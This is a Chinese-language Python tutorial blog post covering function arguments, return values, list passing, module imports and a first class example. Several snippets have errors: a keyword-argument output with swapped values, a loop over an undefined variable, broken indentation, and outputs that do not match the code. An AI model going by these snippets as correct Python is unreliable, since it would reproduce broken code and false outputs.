<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Hello@敬请T期待</span><br></pre></td></tr></table></figure></div>

<h3 id="位置实参"><a href="#位置实参" class="headerlink" title="位置实参"></a>位置实参</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pets.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">animal_type, pet_name</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span> + animal_type + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;My &quot;</span> + animal_type + <span class="string">&quot;&#x27;s name is &quot;</span> + pet_name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">describe_pet(<span class="string">&#x27;hamster&#x27;</span>, <span class="string">&#x27;harry&#x27;</span>)<span class="comment">#传递实参hamster,harry</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">I have a hamster.</span><br><span class="line">My hamster<span class="string">&#x27;s name is Harry.</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>传递实参时需要注意传递的实参的位置，不能随意变换</p>
</blockquote>
<h3 id="关键字实参"><a href="#关键字实参" class="headerlink" title="关键字实参"></a>关键字实参</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#pets.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">animal_type, pet_name</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span> + animal_type + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;My &quot;</span> + animal_type + <span class="string">&quot;&#x27;s name is &quot;</span> + pet_name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">describe_pet(animal_type=<span class="string">&#x27;hamster&#x27;</span>, pet_name=<span class="string">&#x27;harry&#x27;</span>)<span class="comment">#传递关键字实参</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">I have a harry.</span><br><span class="line">My harry<span class="string">&#x27;s name is Hamster.</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>关键字实参的顺序无关紧要</p>
</blockquote>
<h3 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h3><blockquote>
<p>编写函数时，可给每个形参指定默认值。在调用函数中给形参提供了实参时，Python将使用指定的实参值；否则，将使用形参的默认值。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">pet_name, animal_type=<span class="string">&#x27;dog&#x27;</span></span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span> + animal_type + <span class="string">&quot;.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;My &quot;</span> + animal_type + <span class="string">&quot;&#x27;s name is &quot;</span> + pet_name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;willie&#x27;</span>)<span class="comment">#当使用位置关键字时，只有一个实参，默认为pet_name</span></span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;harry&#x27;</span>, animal_type=<span class="string">&#x27;hamster&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">I have a dog.</span><br><span class="line">My dog<span class="string">&#x27;s name is Willie.</span></span><br><span class="line"><span class="string">I have a hamster.</span></span><br><span class="line"><span class="string">My hamster&#x27;</span>s name is harry.</span><br></pre></td></tr></table></figure></div>

<ul>
<li>等效的函数调用</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一条名为Willie的小狗</span></span><br><span class="line">describe_pet(<span class="string">&#x27;willie&#x27;</span>)</span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;willie&#x27;</span>)</span><br><span class="line"><span class="comment"># 一只名为Harry的仓鼠</span></span><br><span class="line">describe_pet(<span class="string">&#x27;harry&#x27;</span>, <span class="string">&#x27;hamster&#x27;</span>)</span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;harry&#x27;</span>, animal_type=<span class="string">&#x27;hamster&#x27;</span>)</span><br><span class="line">describe_pet(animal_type=<span class="string">&#x27;hamster&#x27;</span>, pet_name=<span class="string">&#x27;harry&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="实参可选择化"><a href="#实参可选择化" class="headerlink" title="实参可选择化"></a>实参可选择化</h3><blockquote>
<p>使用空字符串，将实参进行可选择处理</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_formatted_name</span>(<span class="params">first_name, last_name, middle_name=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;注意:可选择的空字符串需要放在后面的位置&quot;&quot;&quot;</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;返回整洁的姓名&quot;&quot;&quot;</span></span><br><span class="line"> 	<span class="keyword">if</span> middle_name:</span><br><span class="line">		full_name = first_name + <span class="string">&#x27; &#x27;</span> + middle_name + <span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line"> 	<span class="keyword">else</span>:</span><br><span class="line">		full_name = first_name + <span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line">	<span class="keyword">return</span> full_name.title()</span><br><span class="line"></span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;jimi&#x27;</span>, <span class="string">&#x27;hendrix&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;john&#x27;</span>, <span class="string">&#x27;hooker&#x27;</span>, <span class="string">&#x27;lee&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure></div>

<h3 id="传递任意数量的实参"><a href="#传递任意数量的实参" class="headerlink" title="传递任意数量的实参"></a>传递任意数量的实参</h3><blockquote>
<p>形参名*toppings中的星号让Python创建一个名为toppings的空元组，并将收到的所有值都封<br>装到这个元组中。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pizza.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pizza</span>(<span class="params">*toppings</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;概述要制作的比萨&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nMaking a pizza with the following toppings:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> topping <span class="keyword">in</span> toppings:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- &quot;</span> + topping)</span><br><span class="line">   </span><br><span class="line">make_pizza(<span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">make_pizza(<span class="string">&#x27;mushrooms&#x27;</span>,<span class="string">&#x27;green peppers&#x27;</span>,<span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Making a pizza with the following toppings:</span><br><span class="line">- pepperoni</span><br><span class="line"></span><br><span class="line">Making a pizza with the following toppings:</span><br><span class="line">- mushrooms</span><br><span class="line">- green peppers</span><br><span class="line">- extra cheese</span><br></pre></td></tr></table></figure></div>



<h3 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#formatted_name.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_formatted_name</span>(<span class="params">first_name, last_name</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;返回整洁的姓名&quot;&quot;&quot;</span></span><br><span class="line"> full_name = first_name + <span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line"> <span class="keyword">return</span> full_name.title()</span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;jimi&#x27;</span>, <span class="string">&#x27;hendrix&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Jimi Hendrix</span><br></pre></td></tr></table></figure></div>

<h4 id="函数返回字典"><a href="#函数返回字典" class="headerlink" title="函数返回字典"></a>函数返回字典</h4><blockquote>
<p>函数可返回任何类型的值，包括列表和字典等较复杂的数据结构。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#person.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_person</span>(<span class="params">first_name, last_name, age=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;返回一个字典，其中包含有关一个人的信息&quot;&quot;&quot;</span></span><br><span class="line">	person = &#123;<span class="string">&#x27;first&#x27;</span>: first_name, <span class="string">&#x27;last&#x27;</span>: last_name&#125;</span><br><span class="line">	<span class="keyword">if</span> age:</span><br><span class="line">	person[<span class="string">&#x27;age&#x27;</span>] = age</span><br><span class="line">	<span class="keyword">return</span> person</span><br><span class="line">musician = build_person(<span class="string">&#x27;jimi&#x27;</span>, <span class="string">&#x27;hendrix&#x27;</span>, age=<span class="number">27</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;jimi&#x27;</span>, <span class="string">&#x27;last&#x27;</span>: <span class="string">&#x27;hendrix&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:27&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="返回值搭配while循环"><a href="#返回值搭配while循环" class="headerlink" title="返回值搭配while循环"></a>返回值搭配while循环</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greet.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_formatted_name</span>(<span class="params">first_name, last_name</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;返回整洁的姓名&quot;&quot;&quot;</span></span><br><span class="line">	full_name = first_name + <span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nPlease tell me your name:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(enter &#x27;q&#x27; to any time to quit)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    f_name=<span class="built_in">input</span>(<span class="string">&quot;First name:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> f_name == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    l_name=<span class="built_in">input</span>(<span class="string">&quot;Last name:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> l_name == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    formatted_name = get_formatted_name(f_name,l_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nHello,&quot;</span>+formatted_name + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Please tell me your name:</span><br><span class="line">(enter <span class="string">&#x27;q&#x27;</span> at any time to quit)</span><br><span class="line">First name: eric</span><br><span class="line">Last name: matthes</span><br><span class="line">Hello, Eric Matthes!</span><br><span class="line">Please tell me your name:</span><br><span class="line">(enter <span class="string">&#x27;q&#x27;</span> at any time to quit)</span><br><span class="line">First name: q</span><br></pre></td></tr></table></figure></div>

<h3 id="传递列表"><a href="#传递列表" class="headerlink" title="传递列表"></a>传递列表</h3><h4 id="向函数中传递列表"><a href="#向函数中传递列表" class="headerlink" title="向函数中传递列表"></a>向函数中传递列表</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greet_users.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet_users</span>(<span class="params">names</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;向列表中的每一位用户发出简单的问候&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        msg = <span class="string">&quot;Hello,&quot;</span> + name.title() + <span class="string">&quot;!&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">usernames = [<span class="string">&#x27;hannah&#x27;</span>,<span class="string">&#x27;ty&#x27;</span>,<span class="string">&#x27;margot&#x27;</span>,<span class="string">&#x27;敬请T期待&#x27;</span>]</span><br><span class="line">greet_users(usernames)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Hello, Hannah!</span><br><span class="line">Hello, Ty!</span><br><span class="line">Hello, Margot!</span><br><span class="line">Hello, 敬请T期待!</span><br></pre></td></tr></table></figure></div>

<h3 id="在函数中修改列表"><a href="#在函数中修改列表" class="headerlink" title="在函数中修改列表"></a>在函数中修改列表</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#print_models.py</span></span><br><span class="line"><span class="comment">#首先创建一个列表，其中包含一些要打印的设计</span></span><br><span class="line">unprinted_designs = [<span class="string">&#x27;iphone case&#x27;</span>, <span class="string">&#x27;robot pendant&#x27;</span>, <span class="string">&#x27;dodecahedron&#x27;</span>]</span><br><span class="line">completed_models = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#模拟打印每一个设计，直到没有未打印的设计为止</span></span><br><span class="line"><span class="comment">#打印每一个设计后，都将其移到列表completed_models中</span></span><br><span class="line"><span class="keyword">while</span> unprinted_designs:</span><br><span class="line">    current_design = unprinted_designs.pop()</span><br><span class="line">    <span class="comment">#模拟根据设计制作3D打印模型的过程</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Printing model:&quot;</span> + current_design)</span><br><span class="line">    completed_models.append(current_design)</span><br><span class="line"><span class="comment">#显示打印好的所有模型</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nThe following models have been printed:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> completed_models <span class="keyword">in</span> completed_models:</span><br><span class="line">    <span class="built_in">print</span>(completed_model)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Printing model: dodecahedron</span><br><span class="line">Printing model: robot pendant</span><br><span class="line">Printing model: iphone case</span><br><span class="line"></span><br><span class="line">The following models have been printed:</span><br><span class="line">dodecahedron</span><br><span class="line">robot pendant</span><br><span class="line">iphone case</span><br></pre></td></tr></table></figure></div>

<p>提高效率版</p>
<blockquote>
<p>每个函数都应只负责一项具体的工作。第一个函数打印每个设计，而第二个显示打印好的模型；这优于使用一个函数来完成两项工作。编写函数时，如果你发现它执行的任务太多，请尝试将这些代码划分到两个函数中。别忘了，总是可以在一个函数中调用另一个函数，这有助于将复杂的任务划分成一系列的步骤。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#print_models()</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_models</span>(<span class="params">unprinted_designs, completed_models</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    模拟打印每个设计，直到没有未打印的设计为止</span></span><br><span class="line"><span class="string">    打印每个设计后，都将其移到列表completed_models中</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> unprinted_designs:</span><br><span class="line">        current_design = unprinted_designs.pop()</span><br><span class="line">        <span class="comment"># 模拟根据设计制作3D打印模型的过程</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Printing model: &quot;</span> + current_design)</span><br><span class="line">		completed_models.append(current_design)</span><br><span class="line"><span class="comment">#show_completed_models()    </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_completed_models</span>(<span class="params">completed_models</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;显示打印好的所有模型&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nThe following models have been printed:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> completed_model <span class="keyword">in</span> completed_models:</span><br><span class="line">        <span class="built_in">print</span>(completed_model)</span><br><span class="line"></span><br><span class="line">unprinted_designs = [<span class="string">&#x27;iphone case&#x27;</span>, <span class="string">&#x27;robot pendant&#x27;</span>, <span class="string">&#x27;dodecahedron&#x27;</span>]</span><br><span class="line">completed_models = []</span><br><span class="line">print_models(unprinted_designs, completed_models)</span><br><span class="line">show_completed_models(completed_models)</span><br></pre></td></tr></table></figure></div>

<h4 id="传递列表副本"><a href="#传递列表副本" class="headerlink" title="传递列表副本"></a>传递列表副本</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">function_name(list_name[:])</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>切片表示法[:]创建列表的副本。向函数传递列表的副本可保留原始列表的内容。</p>
<p>但除非有充分的理由需要传递副本，否则还是应该将原始列表传递给函数，因为让函数使用现成列表可避免花时间和内存创建副本，从而提高效率，在处理大型列表时尤其如此。</p>
</blockquote>
<h3 id="将函数存储在模块中"><a href="#将函数存储在模块中" class="headerlink" title="将函数存储在模块中"></a>将函数存储在模块中</h3><h4 id="import导入整个模块"><a href="#import导入整个模块" class="headerlink" title="import导入整个模块"></a>import导入整个模块</h4><blockquote>
<p>模块是扩展名为.py的文件，包含要导入到程序中的代码。</p>
</blockquote>
<blockquote>
<p>import 导入外部模块，但是需要用‘.语句’来调用函数</p>
<p><strong>module_name</strong>.**function_name()**调用模块内的函数；</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pizza.py</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pizza</span>(<span class="params">size, *toppings</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;概述要制作的比萨&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nMaking a &quot;</span> + <span class="built_in">str</span>(size) +<span class="string">&quot;-inch pizza with the following toppings:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> topping <span class="keyword">in</span> toppings:</span><br><span class="line">   		<span class="built_in">print</span>(<span class="string">&quot;- &quot;</span> + topping)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在pizza.py所在的目录中创建另一个名为making_pizzas.py的文件，这个文件导入刚创建的模块，再调用make_pizza()两次：</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#making_pizza.py</span></span><br><span class="line"><span class="keyword">import</span> pizza</span><br><span class="line"></span><br><span class="line">pizza.make_pizza(<span class="number">16</span>, <span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">pizza.make_pizza(<span class="number">12</span>, <span class="string">&#x27;mushrooms&#x27;</span>, <span class="string">&#x27;green peppers&#x27;</span>, <span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Making a 16-inch pizza with the following toppings:</span><br><span class="line">- pepperoni</span><br><span class="line"></span><br><span class="line">Making a 12-inch pizza with the following toppings:</span><br><span class="line">- mushrooms</span><br><span class="line">- green peppers</span><br><span class="line">- extra cheese</span><br></pre></td></tr></table></figure></div>

<h4 id="导入特定的函数"><a href="#导入特定的函数" class="headerlink" title="导入特定的函数"></a>导入特定的函数</h4><p>从模块中导入特定的一个函数</p>
<blockquote>
<p>利用 <strong>from</strong> <u>module_name</u> <strong>import</strong> <u>function_named</u></p>
</blockquote>
<p>通过用逗号分隔函数名，可根据需要从模块中导入任意数量的函数：</p>
<blockquote>
<p><strong>from</strong> <u>module_name</u> <strong>import</strong> <u>function_0</u>, <u>function_1</u>, <u>function_2</u></p>
</blockquote>
<h4 id="使用-as-给函数指定别名"><a href="#使用-as-给函数指定别名" class="headerlink" title="使用 as 给函数指定别名"></a>使用 as 给函数指定别名</h4><blockquote>
<p> 如果要导入的函数的名称可能与程序中现有的名称冲突，或者函数的名称太长，可指定简短而独一无二的别名——函数的另一个名称，类似于外号。要给函数指定这种特殊外号，需要在导入它时这样做。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#turtle.py</span></span><br><span class="line"><span class="comment">#导入turtle库画一个正方形</span></span><br><span class="line"><span class="keyword">import</span> turtle <span class="keyword">as</span> t</span><br><span class="line">color = [<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;purple&#x27;</span>,<span class="string">&#x27;#33cc8c&#x27;</span>]</span><br><span class="line">t.penup()</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.goto(-<span class="number">100</span>,-<span class="number">100</span>)</span><br><span class="line">t.pendown()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    t.pencolor(color[i])</span><br><span class="line">    t.forward(<span class="number">200</span>)</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">t.fillcolor(<span class="string">&#x27;pink&#x27;</span>)</span><br><span class="line">t.end_fill()</span><br><span class="line">t.down()</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/turtle%E7%A4%BA%E4%BE%8B.png" style="zoom: 67%;">)</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*— coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#making_pizza.py</span></span><br><span class="line"><span class="keyword">from</span> pizza <span class="keyword">import</span> make_pizza <span class="keyword">as</span> mp</span><br><span class="line">mp(<span class="number">16</span>, <span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">mp(<span class="number">12</span>, <span class="string">&#x27;mushrooms&#x27;</span>, <span class="string">&#x27;green peppers&#x27;</span>, <span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="导入模块中的所有函数"><a href="#导入模块中的所有函数" class="headerlink" title="导入模块中的所有函数"></a>导入模块中的所有函数</h4><blockquote>
<p><strong>from</strong> <u>module_name</u> <strong>import</strong> *</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pizza <span class="keyword">import</span> *</span><br><span class="line">make_pizza(<span class="number">16</span>, <span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">make_pizza(<span class="number">12</span>, <span class="string">&#x27;mushrooms&#x27;</span>, <span class="string">&#x27;green peppers&#x27;</span>, <span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="创建和使用类"><a href="#创建和使用类" class="headerlink" title="创建和使用类"></a>创建和使用类</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dog.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">	<span class="string">&quot;&quot;&quot;一次模拟小狗的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">       <span class="comment">#注意:init左右两边各有2个”_&quot;是&quot;__&quot;不是&quot;_&quot;</span></span><br><span class="line">   	<span class="string">&quot;&quot;&quot;初始化属性name和age&quot;&quot;&quot;</span></span><br><span class="line">    	self.name = name</span><br><span class="line">   	self.age = age</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">   	<span class="string">&quot;&quot;&quot;模拟小狗被命令时蹲下&quot;&quot;&quot;</span></span><br><span class="line">   	<span class="built_in">print</span>(self.name.title() + <span class="string">&quot; is now sitting.&quot;</span>)</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">  		<span class="string">&quot;&quot;&quot;模拟小狗被命令时打滚&quot;&quot;&quot;</span></span><br><span class="line">   	<span class="built_in">print</span>(self.name.title() + <span class="string">&quot; rolled over!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>__init__()是一个特殊的方法,对定义类的属性进行初始化，python自动调用，类似于C++的构造函数。</p>
<p>注意:init左右两边各有2个”__“是”__“(两个英文下划线)不是”_”</p>
<p>在这个方法的定义中，形参self必不可少，还必须位于其他形参的前面。</p>
<p>Python调用这个__init__()方法来创建类实例时，将自动传入实参self。每个与类相关联的方法调用都自动传递实参self，它是一个指向实例本身的引用，让实例能够访问类中的属性和方法。</p>
</blockquote>
<h4 id="创建类实例"><a href="#创建类实例" class="headerlink" title="创建类实例"></a>创建类实例</h4><p><strong>调用实例的属性</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dog.py</span></span><br><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;is now sitting.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;rolled over!&quot;</span>)</span><br><span class="line">my_dog=Dog(<span class="string">&quot;willie&quot;</span>,<span class="number">6</span>)<span class="comment">#创建抽象类的实例化对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog&#x27;s name is &quot;</span>+ my_dog.name.title())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog is &quot;</span>+<span class="built_in">str</span>(my_dog.age)+<span class="string">&quot;years old.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">My dog<span class="string">&#x27;s name is Willie.</span></span><br><span class="line"><span class="string">My dog is 6 years old.</span></span><br></pre></td></tr></table></figure></div>

<p><strong>调用实例的方法</strong></p>
